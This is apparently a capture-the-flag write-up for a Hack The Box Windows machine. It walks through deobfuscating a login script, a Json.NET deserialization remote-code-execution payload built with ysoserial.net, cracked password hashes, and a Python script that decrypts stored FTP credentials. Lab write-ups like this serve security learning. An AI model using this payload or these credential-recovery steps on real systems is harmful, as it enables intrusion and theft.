![](./logo.png)

# USER

After enumeration of the website it can be seen there is some obfuscated `javascript`.

```javascript
var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", 
"\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", 
"\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", 
"\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", 
"\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", 
"\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", 
"\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f
[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = 
{ UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if 
(_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])
[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; 
_0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, 
_0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": 
_0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4])
; window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }])
```

Running this through an online deobfuscator alongside a script that substitutes all values in the list `_0xd18f`, we can obtain a cleaner version. Below is the readable `javascript`:

```javascript
angular[module](json, [ngCookies])[controller](loginController, [$http, $scope, $cookies, function (_0x30f6x1, _0x30f6x2, _0x30f6x3) {
    _0x30f6x2[credentials] = {
        UserName: "",
        Password: ""
    };
    _0x30f6x2[error] = {
        message: "",
        show: false
    };
    var _0x30f6x4 = _0x30f6x3[get](OAuth2);
    if (_0x30f6x4) {
        window[location][href] = index.html
    };
    _0x30f6x2[login] = function () {
        _0x30f6x1[post](/api/token, _0x30f6x2[credentials])[then](function (_0x30f6x5) {
            window[location][href] = index.html
        }, function (_0x30f6x6) {
            _0x30f6x2[error][message] = Invalid Credentials.;
            _0x30f6x2[error][show] = true;
            console[log](_0x30f6x6)
        })
    }
}])[controller](principalController, [$http, $scope, $cookies, function (_0x30f6x1, _0x30f6x2, _0x30f6x3) {
    var _0x30f6x4 = _0x30f6x3[get](OAuth2);
    if (_0x30f6x4) {
        _0x30f6x1[get](/api/Account/, {
            headers: {
                "Bearer": _0x30f6x4
            }
        })[then](function (_0x30f6x5) {
            _0x30f6x2[UserName] = _0x30f6x5[data][Name]
        }, function (_0x30f6x6) {
            _0x30f6x3[remove](OAuth2);
            window[location][href] = login.html
        })
    } else {
        window[location][href] = login.html
    }
}])
```
The code seems to be handling the login for user authentication. 

What caught my eye wass the implication to add a `Bearer` header to a GET request to `/api/account`

Doing this provides us with the output below:

```xml
<Error>
  <Message>An error has occurred.</Message>
  <ExceptionMessage>Invalid format base64</ExceptionMessage>
  <ExceptionType>System.Exception</ExceptionType>
  <StackTrace />
</Error>
```

Then, adding valid `base64` gives us:

```xml
<Error>
  <Message>An error has occurred.</Message>
  <ExceptionMessage>Cannot deserialize Json.Net Object</ExceptionMessage>
  <ExceptionType>System.Exception</ExceptionType>
  <StackTrace />
</Error>
```

Researching online has provided linked to Json.NET desearalize vulerabilities.

A [payload generator](https://github.com/pwntester/ysoserial.net) was used to create a payload. This when sent executes our command!

The payload used is below:

```json
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", 
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd","/c <COMMAND>"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"},
    "m_userToken": 0
}
```

This allows RCE and spawns a shell on the box! The exploit has been encapsulated in `exploit.py`. This lets us grab the `user.txt`!

# ROOT

Present in the `IS` server is a `usercredentials` file

```bash
$ more "C:\inetpub\wwwroot\jsonapp\dbdata\userscredentials - Copy.json"
```
```json
[
    {
      "Id": 1,
      "UserName": "puppet",
      "Password": "0571749e2ac330a7455809c6b0e7af90",
      "Name": "User Admin HTB",
      "Rol": "Administrator"
    },
    {
      "Id": 1,
      "UserName": "ansible",
      "Password": "84d961568a65073a3bcf0eb216b2a576",
      "Name": "User",
      "Rol": "User"
    }
]
```

Cracking these hashes gives us:

```
puppet:sunshine
ansible:superman
```

However, these credentials above did not working in any of the detected login pages.

Some more invetigation uncovered a tool called `Sync2Ftp`. Online searches for this brought up nothing of interest.
Therefore, it can be assumed to be a custom tool

The directory `C:\Program Files\Sync2Ftp` included two files - the config:

```xml
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <appSettings>
    <add key="destinationFolder" value="ftp://localhost/"/>
    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
    <add key="minute" value="30"/>
    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
  </appSettings>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
  </startup>
</configuration>
```

And an `.exe`. The thing to note is the use of `.Net`. If the `.exe` is compiled with `.Net` it should be very easy
to reverse it and obtain very clear `.Net` code.


I transfered it back to my machine as `base64` using:
```
certutil -encode SyncLocation.exe C:\tmp\base64.txt
```

And decompiled it using JetBrains `dotPeak`.

The `.exe` contains two methods, `encrypt` and `decrypt`:


Decrypt:

```C#
public static string Decrypt(string cipherString, bool useHashing)
{
    byte[] inputBuffer = Convert.FromBase64String(cipherString);
    string s = (string) new AppSettingsReader().GetValue("SecurityKey", typeof (string));
    byte[] numArray;
    if (useHashing)
    {
        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
        numArray = cryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
        cryptoServiceProvider.Clear();
    }
    else
    numArray = Encoding.UTF8.GetBytes(s);
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    cryptoServiceProvider1.Key = numArray;
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    cryptoServiceProvider1.Padding = PaddingMode.PKCS7;
    byte[] bytes = cryptoServiceProvider1.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    cryptoServiceProvider1.Clear();
    return Encoding.UTF8.GetString(bytes);
}
```

Encrypt:

```C#
public static string Encrypt(string toEncrypt, bool useHashing)
{
    byte[] bytes = Encoding.UTF8.GetBytes(toEncrypt);
    string s = (string) new AppSettingsReader().GetValue("SecurityKey", typeof (string));
    byte[] numArray;
    if (useHashing)
    {
        MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
        numArray = cryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(s));
        cryptoServiceProvider.Clear();
    }
    else
    numArray = Encoding.UTF8.GetBytes(s);
    TripleDESCryptoServiceProvider cryptoServiceProvider1 = new TripleDESCryptoServiceProvider();
    cryptoServiceProvider1.Key = numArray;
    cryptoServiceProvider1.Mode = CipherMode.ECB;
    cryptoServiceProvider1.Padding = PaddingMode.PKCS7;
    byte[] inArray = cryptoServiceProvider1.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
    cryptoServiceProvider1.Clear();
    return Convert.ToBase64String(inArray, 0, inArray.Length);
}
```

The method we want here is `decrypt`. Below is it converted into a `python` script:


```python
import base64
import hashlib
from Crypto.Cipher import DES3

SecurityKey = "_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"

password = "oQ5iORgUrswNRsJKH9VaCw=="
username = "4as8gqENn26uTs9srvQLyg=="

def decrypt(string, hashing):

    base64_data = base64.b64decode(string)

    SecKeyBytes = SecurityKey.encode("utf-8")

    if hashing:
        numArray = hashlib.md5(SecKeyBytes).digest()
    else:
        numArray = SecKeyBytes

    cipher = DES3.new(numArray, DES3.MODE_ECB)

    d = cipher.decrypt(base64_data)

    print(d.decode())

decrypt(username, hashing=True)
decrypt(password, hashing=True)
```

We get from this a username and password:

```
superadmin
funnyhtb
```

We can then use this to log on as the `superadmin` via the `ftp` server.
This lets us grab the `root.txt`